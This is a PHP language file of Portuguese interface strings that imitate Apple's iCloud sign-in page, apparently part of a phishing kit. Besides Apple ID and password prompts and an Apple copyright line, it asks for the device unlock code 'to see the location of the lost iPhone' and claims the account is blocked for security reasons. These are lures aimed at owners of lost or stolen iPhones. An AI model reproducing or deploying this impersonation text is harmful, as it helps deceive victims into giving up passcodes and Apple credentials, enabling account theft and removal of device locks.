<?php

/* MIOS */

$lang = array();
$lang['TTILE'] = 'iCloud';
$lang['DESCRIP'] = 'Entre no iCloud para acessar suas fotos, vídeos, documentos, notas, contatos e muito mais. Use seu ID Apple ou crie uma conta para começar a usar os serviços Apple.';
$lang['DESCARGA'] = 'Baixe iCloud para Windows';
$lang['ACTULIZADO'] = 'Mantenha atualizada a versão mais recente de todos os seus documentos, vídeos, fotos e muito mais, no seu PC.';
$lang['DESCARGA_AHORA'] = 'Descarregar agora';


//Header
$lang['CREAR_ID_APPLE'] = 'Criar ID da Apple';
$lang['ESTADO_SISTEMA'] = 'Status do sistema';
 
$lang['POLICY'] = 'Política de privacidade';
$lang['TERMS'] = 'Termos e Condições';
$lang['COPYRIGHT'] = 'Copyright © 2021 Apple Inc. Todos os direitos reservados';


$lang['COD_BLOQUEO'] = 'Digite seu código de desbloqueio';
$lang['INCORRECTO'] = 'Código de bloqueio errado.';
$lang['COMENTARIO'] = 'Digite seu código de bloqueio para ver a localização do iPhone perdido.';

$lang['NO_CODIGO'] = 'Esqueceu seu código?';
$lang['BLOQ_SEGURIDAD'] = 'Este ID Apple foi bloqueado por motivos de segurança.';

$lang['COM_DEB_CUENTA'] = 'Antes de fazer o login, você deve desbloquear a conta.';

$lang['DEB_CUENTA'] = 'Desbloquear a conta';

$lang['VERIFI_PATRON'] = 'Verificando…';


//DATOS 

$lang['SIGN_IN_TITLE'] = 'Inicie sessão no iCloud';
$lang['APPLE_ID'] = 'ID Apple';


$lang['PASSWORD'] = 'Senha';
$lang['APPLE_INCORRECTO'] = 'A senha ou ID Apple está incorreta.';
$lang['FORGOT_ID'] = 'Você esqueceu a senha?';
$lang['PER_CONECTADO'] = 'Manter a sessão aberta';
$lang['OLVIDADO'] = 'Esqueceu o ID Apple ou a senha ?';







?>